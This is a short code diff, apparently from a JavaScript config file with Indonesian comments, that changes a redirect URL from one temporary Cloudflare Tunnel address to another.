@@ -7,7 +7,7 @@ const CONFIG = {
     // ============================================
     // LINK CLOUDFLARE TUNNEL (tujuan redirect)
     // ============================================
-    redirectUrl: "https://wants-serious-defines-traditional.trycloudflare.com/acr-nexus",
+    redirectUrl: "https://concert-county-handmade-review.trycloudflare.com/acr-nexus",
     
     // ============================================
     // DURASI LOADING (dalam milidetik)
